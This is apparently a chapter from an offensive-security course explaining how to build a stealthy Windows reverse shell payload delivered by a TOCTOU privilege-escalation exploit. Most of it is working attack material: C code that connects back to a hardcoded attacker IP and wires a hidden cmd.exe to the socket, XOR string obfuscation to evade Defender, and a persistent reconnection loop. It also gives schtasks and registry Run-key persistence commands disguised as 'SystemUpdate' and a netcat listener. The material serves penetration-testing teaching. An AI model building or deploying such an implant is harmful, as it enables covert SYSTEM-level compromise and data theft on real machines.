# Chapter 12 — Reverse Shell: The Callback

## What Is a Reverse Shell?

A reverse shell is a **radio callback**. Your payload, planted behind
enemy lines, phones home to your listening post. You pick up, and
now you're issuing commands to a machine you don't physically control.

There are two types of remote shells:

### Bind Shell — The Listening Post Forward

```
Target machine opens a port and WAITS for you to connect.

  Target (port 4444 open) ◄──── Attacker connects in
```

Problem: firewalls block inbound connections. The target's perimeter
defence drops your connection before it reaches the shell. Like trying
to walk into a base through the front gate — the sentries stop you.

### Reverse Shell — The Callback

```
Attacker opens a port and WAITS. Target connects OUT to you.

  Attacker (listening on 4444) ◄──── Target calls home
```

Outbound connections usually pass through firewalls unchallenged —
firewalls are configured to block traffic coming IN, not going OUT.
The target machine initiates the connection like any normal web
request. The payload phones home through the same door that browsers
use. The sentries don't question someone leaving the base.

**This is what we use.** The TOCTOU plants the payload on the target.
The payload calls back to our listening post. We answer. SYSTEM shell.

## The Winsock Arsenal

Windows networking runs through the **Winsock** API — `ws2_32.dll`.
Every network operation in our reverse shell uses Winsock functions.

### WSAStartup — Powering On the Radio

Before any network operation, you initialize Winsock:

```c
WSADATA wsData;
WSAStartup(MAKEWORD(2, 2), &wsData);
```

`MAKEWORD(2, 2)` requests Winsock version 2.2. This is the only
version that matters — it's been standard since Windows 98. Call
this ONCE at program startup. It's reference-counted, so calling
it multiple times works but wastes cycles.

Think of it as powering on the radio. You do it once when you set
up the comms station, not every time you key the mic.

### WSASocket vs socket — THE Critical Difference

This is where your shadow_shell broke. Two functions that look
identical but behave differently:

```c
// socket() — the standard call. CREATES AN OVERLAPPED SOCKET.
SOCKET s1 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

// WSASocket() with flags=0 — CREATES A NON-OVERLAPPED SOCKET.
SOCKET s2 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,
                      NULL, 0, 0);
//                            ^^^ dwFlags = 0
```

Both create a TCP socket. Both connect the same way. Both send and
receive data identically. The difference is invisible until you try
to use the socket as a file handle — which is exactly what handle
redirection does.

**Overlapped** = the socket supports asynchronous I/O. Every
read/write operation expects an OVERLAPPED structure. Without one,
the operation either fails silently or hangs.

**Non-overlapped** = the socket does synchronous I/O. ReadFile and
WriteFile work normally. cmd.exe, which does synchronous stdio,
works correctly.

```
socket()     →  overlapped by default  →  cmd.exe stdio BREAKS
WSASocket(flags=0) → non-overlapped   →  cmd.exe stdio WORKS
```

That's it. That's the entire bug. One flag. `socket()` implicitly
sets `WSA_FLAG_OVERLAPPED`. `WSASocket()` with `dwFlags=0` doesn't.

### Why This Matters for the Reverse Shell

When we redirect cmd.exe's stdin/stdout/stderr to the socket:

```c
si.hStdInput  = (HANDLE)sock;
si.hStdOutput = (HANDLE)sock;
si.hStdError  = (HANDLE)sock;
```

cmd.exe calls `ReadFile()` on hStdInput to read commands, and
`WriteFile()` on hStdOutput to send output. These are **synchronous**
calls — cmd.exe has no OVERLAPPED struct, no async callback, no
completion routine. It just calls ReadFile and expects bytes.

With an overlapped socket handle, ReadFile returns
`ERROR_INVALID_PARAMETER` or blocks indefinitely. cmd.exe gets
no input, produces no output. The shell is connected but dead.

With a non-overlapped socket handle, ReadFile blocks until data
arrives (the attacker typing a command), returns the bytes, and
cmd.exe processes them normally. Output flows back through
WriteFile → socket → attacker.

### connect / WSAConnect — Reaching the Listening Post

```c
struct sockaddr_in target;
target.sin_family      = AF_INET;
target.sin_port        = htons(4444);
target.sin_addr.s_addr = inet_addr("192.168.1.100");

WSAConnect(sock, (SOCKADDR *)&target, sizeof(target),
           NULL, NULL, NULL, NULL);
```

This is dialling the radio. `sin_addr` is the frequency (IP address),
`sin_port` is the channel (port number). If the attacker's listener
is running, the connection completes. If not, `SOCKET_ERROR` — no
answer on the net, try again later.

## Handle Redirection — The Wire Tap

The core trick of a reverse shell is redirecting a process's standard
I/O handles to a network socket. This is the wire tap — everything
the command interpreter reads or writes goes through your socket
instead of the local console.

### STARTUPINFO — Rewiring the Console

```c
STARTUPINFOA si;
memset(&si, 0, sizeof(si));
si.cb = sizeof(si);
si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
si.wShowWindow = SW_HIDE;
si.hStdInput  = (HANDLE)sock;    // Commands come FROM the attacker
si.hStdOutput = (HANDLE)sock;    // Output goes TO the attacker
si.hStdError  = (HANDLE)sock;    // Errors go TO the attacker
```

`STARTF_USESTDHANDLES` tells CreateProcess: "don't allocate default
stdio handles — use the ones I've specified." Without this flag,
cmd.exe gets default console handles and the redirect doesn't happen.

`STARTF_USESHOWWINDOW` + `SW_HIDE` makes the window invisible.
Without it, a console window flashes on the target's screen —
immediate detection.

### Why Socket-to-Handle Casting Works

Winsock socket handles ARE Windows kernel handles. They live in the
same handle table as file handles, event handles, and process handles
(Chapter 1). The cast `(HANDLE)sock` isn't a hack — it's documented
behaviour. Microsoft designed Winsock handles to be usable anywhere
a generic HANDLE is accepted.

This is why `ReadFile(hStdInput, ...)` works on a socket — the
kernel sees a handle, looks it up in the handle table, finds a
socket object, and performs a synchronous read on it. Same mechanism
as reading from a file or a pipe.

### CreateProcess — Spawning the Shell

```c
CreateProcessA(
    NULL,               // No application name — use command line
    "cmd.exe",          // The command interpreter
    NULL, NULL,         // Default security for process and thread
    TRUE,               // bInheritHandles — MUST be TRUE
    CREATE_NO_WINDOW,   // No visible console
    NULL, NULL,         // Default environment and working directory
    &si,                // Our rigged STARTUPINFO
    &pi                 // Receives process/thread handles
);
```

`bInheritHandles = TRUE` is non-negotiable. Without it, the child
process doesn't inherit our socket handle, and the redirected stdio
handles become invalid. cmd.exe would open, fail to read stdin, and
exit immediately.

`CREATE_NO_WINDOW` prevents console window allocation. Combined with
`SW_HIDE`, the shell is completely invisible on the target machine.

### The Data Flow

```
Attacker types "whoami"
    │
    ▼
Network packet → socket on target
    │
    ▼
cmd.exe reads from hStdInput (= socket)
    │
    ▼
cmd.exe executes "whoami"
    │
    ▼
cmd.exe writes "nt authority\system" to hStdOutput (= socket)
    │
    ▼
Network packet → attacker's terminal

Total latency: ~1-5ms on LAN. Feels like a local terminal.
```

## The GUI Subsystem Trap

### main() vs WinMain()

C programs have two entry points:

```c
// Console subsystem — allocates a visible console window
int main(int argc, char *argv[]) { ... }

// Windows (GUI) subsystem — no console window
int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) { ... }
```

For a reverse shell, you want `WinMain` — a console window appearing
on the target is immediate detection. But switching from `main()` to
`WinMain()` changes the PE subsystem flag in the compiled binary
from `IMAGE_SUBSYSTEM_WINDOWS_CUI` (console) to
`IMAGE_SUBSYSTEM_WINDOWS_GUI` (graphical).

The subsystem flag itself doesn't break anything. What breaks things
is that people typically switch to WinMain AND switch from WSASocket
to socket() at the same time (or they were already using socket()).
The bug gets blamed on "GUI mode" when it's actually the socket flag.

### The Fix Stack

For an invisible, working reverse shell:

1. `WinMain` entry point (no console for the payload process)
2. `WSASocket(flags=0)` (non-overlapped handle for stdio redirect)
3. `SW_HIDE` in STARTUPINFO (cmd.exe window hidden)
4. `CREATE_NO_WINDOW` in CreateProcess (no console allocation)

All four together = invisible shell that actually works.

## String Obfuscation

### Why "cmd.exe" in Plaintext Gets Flagged

Defender's static analysis scans every string in your binary. A
program that contains "cmd.exe" combined with Winsock imports is a
textbook reverse shell signature. Even without behavioural analysis,
the string alone raises the threat score.

### XOR Encoding — Same Technique as EICAR

Same approach used for the EICAR pattern in the main exploit.
Encode the string at compile time, decode at runtime:

```c
#define XOR_KEY 0x41

// "cmd.exe" XOR-encoded with key 0x41
static const unsigned char xCmd[] = {
    0x22, 0x2C, 0x25, 0x6F, 0x24, 0x39, 0x24, 0x00
};

// Decode on the stack — never in a global buffer
unsigned char cmd[8];
memcpy(cmd, xCmd, sizeof(xCmd));
for (int i = 0; i < 7; i++) cmd[i] ^= XOR_KEY;
// cmd now contains "cmd.exe" — only on the stack, only at runtime
```

The binary contains `0x22 0x2C 0x25 0x6F 0x24 0x39 0x24` — gibberish
to static analysis. At runtime, it decodes to "cmd.exe" on the stack,
gets used immediately by CreateProcess, and disappears when the
function returns.

### Verify It Yourself

After compiling, check the binary for plaintext strings:

```cmd
findstr /i "cmd.exe" bb5_revshell.exe
```

Should return nothing. If "cmd.exe" appears, the encoding is broken.

## Reconnection — Persistence Through Resilience

### Why Reconnect?

Connections drop. The attacker's listener restarts. Network
interruptions happen. A one-shot reverse shell that exits on
disconnect is a wasted plant — you burned the TOCTOU race for
a single session.

### The Reconnection Loop

```c
while (1) {
    SOCKET ch = EstablishChannel();
    if (ch != INVALID_SOCKET) {
        SpawnShell(ch);       // Blocks until session ends
        closesocket(ch);
    }
    Sleep(5000);              // Wait 5 seconds, try again
}
```

When the attacker disconnects, `WaitForSingleObject` in SpawnShell
returns (cmd.exe exits because its stdio pipe broke). The loop
sleeps 5 seconds and tries again. If the attacker restarts the
listener, the next connection attempt succeeds. New shell. No
re-exploitation required.

### Sleep Duration Trade-offs

| Delay | Pro | Con |
|-------|-----|-----|
| 1 second | Fast reconnect | Looks like a port scan if listener is down |
| 5 seconds | Good balance | Standard for most implants |
| 30 seconds | Very quiet | Slow to reconnect after listener restart |
| Jittered (random 3-10s) | Harder to fingerprint timing | More complex code |

5 seconds is the default. For a mock corporate engagement on LAN,
it's fine. For a real-world implant, you'd add jitter — randomised
sleep intervals that defeat timing-based network detection.

## Integration with the TOCTOU Chain

### How the Pieces Fit Together

```
vader_toctou.exe                    bb5_revshell.exe
(delivery vehicle)                  (the payload)
────────────────                    ────────────────
Standard user runs it               Pre-compiled, waiting on disk
        │
  TOCTOU fires                      
  Defender follows junction          
  SYSTEM writes to System32    ────► Payload lands in System32
        │
  Exploit complete.                  Payload needs a trigger.
        │                                    │
        └────────────────────────────────────┘
                                             │
                                    Trigger fires payload
                                    (schtask / DLL hijack / Run key)
                                             │
                                    Payload connects to attacker
                                    SYSTEM shell established
                                             │
                                    Attacker reads flag file
                                    ACCESS DENIED → ACCESS GRANTED
                                    Engagement complete.
```

### Execution Triggers

The TOCTOU plants the file. Something needs to EXECUTE it. Options:

**Scheduled Task (easiest to demonstrate):**
```cmd
:: From the first SYSTEM shell session:
schtasks /create /tn "SystemUpdate" /tr "C:\Windows\System32\payload.exe" /sc onlogon /ru SYSTEM
```

**Registry Run Key (runs on login):**
```cmd
:: From SYSTEM shell:
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdate" /t REG_SZ /d "C:\Windows\System32\payload.exe"
```

**DLL Search Order Hijack (most stealthy):**
Rename payload as a DLL that a SYSTEM service loads from System32.
Requires modifying the payload to export a DllMain entry point.
Most sophisticated but also most fragile — wrong DLL name and
the target service crashes.

For the mock corporate engagement: scheduled task. Clear, documented,
easy to verify in the pentest report. Stealth is a secondary concern
when you're writing an engagement report, not evading a SOC.

## Evasion Considerations

### Static Analysis Evasion

1. **No plaintext strings** — "cmd.exe" XOR-encoded
2. **Standard imports only** — ws2_32.dll + kernel32.dll. No exotic
   DLLs that flag the import table (lesson from RedSun/CldApi.dll)
3. **Small binary** — `/O1` optimisation, no runtime library bloat
4. **No embedded IPs in plaintext** — the C2 IP is compiled in as a
   `sin_addr.s_addr` integer, not a readable string

### Behavioural Detection

Defender's behaviour monitoring watches for:
- Process creation chains (payload.exe → cmd.exe)
- Network connections from unusual processes
- Handle redirection patterns (STARTF_USESTDHANDLES on a network socket)

This is harder to evade than static analysis. Options:
- Use PowerShell instead of cmd.exe (different process chain)
- Use named pipes for I/O instead of direct socket handles
- Inject into a legitimate process instead of spawning a new one

For academic demonstration: static evasion is sufficient. Behavioural
evasion is a post-graduate exercise.

### Import Table Fingerprinting

Your reverse shell imports:
- `WSAStartup`, `WSASocket`, `WSAConnect` from ws2_32.dll
- `CreateProcessA`, `Sleep`, `WaitForSingleObject` from kernel32.dll

This import combination IS a reverse shell signature if Defender
decides to fingerprint it. But unlike RedSun (which imported CldApi.dll
— an extremely rare import), these are common imports used by thousands
of legitimate programs. The signal-to-noise ratio is in your favour.

## Setting Up the Listener

On your attack platform, you need a listener — a process waiting
for the callback. Simplest option:

### Netcat / Ncat

```cmd
:: On your attack machine:
ncat -lvp 4444
```

When the payload connects, you'll see the cmd.exe prompt and can
type commands. Output flows back through the socket.

### Verify the Listener

```
[attacker]$ ncat -lvp 4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection received from 192.168.1.50:49832

Microsoft Windows [Version 10.0.26200.5603]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\System32> whoami
nt authority\system

C:\Windows\System32> type C:\CompanyData\Confidential\flag.txt
ACCESS GRANTED — you are reading this from SYSTEM context.
The standard user account could not read this file.
```

That's the engagement. Standard user → TOCTOU → SYSTEM → flag.

## Key Takeaways

- Reverse shells connect OUT from target to attacker — bypasses inbound firewall rules
- `WSASocket(flags=0)` creates non-overlapped sockets — REQUIRED for handle redirection
- `socket()` creates overlapped sockets by default — BREAKS cmd.exe stdio redirect
- Handle redirection wires cmd.exe stdin/stdout/stderr to the network socket
- `WinMain` + `SW_HIDE` + `CREATE_NO_WINDOW` = invisible to the target user
- XOR-encoded strings evade static analysis — no "cmd.exe" in the binary
- Reconnection loop provides persistence without registry/scheduled task
- The reverse shell is the PAYLOAD — vader_toctou.c is the DELIVERY

## Test Program

The reverse shell IS the test program. To verify:

1. Open a listener on your attack machine: `ncat -lvp 4444`
2. Edit C2_IP and C2_PORT in the source to match your listener
3. Compile: `cl.exe bb5_revshell_annotated.c /Fe:bb5_revshell.exe /O1 /GS-`
4. Run `bb5_revshell.exe` on the target (or same machine for testing)
5. Verify: type `whoami` in the listener — should return your username
6. Verify: type `dir` — should show directory listing
7. Verify: binary contains no plaintext "cmd.exe": `findstr /i "cmd.exe" bb5_revshell.exe`
